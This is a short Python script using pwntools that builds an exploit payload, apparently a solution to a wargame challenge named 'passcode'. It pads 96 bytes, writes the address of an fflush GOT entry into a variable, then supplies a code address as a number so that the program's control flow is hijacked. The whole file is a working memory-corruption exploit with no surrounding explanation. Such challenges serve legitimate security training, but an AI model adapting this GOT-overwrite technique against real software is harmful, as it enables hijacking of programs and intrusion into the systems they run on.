from pwn import *

buf = ""
buf += 'A' * 96		# offset to passcode1 
buf += p32(0x0804a004)	# passcode1 pointing to fflush GOT entry
buf += str(0x080485e3)	# send as a number not an address

print(buf)
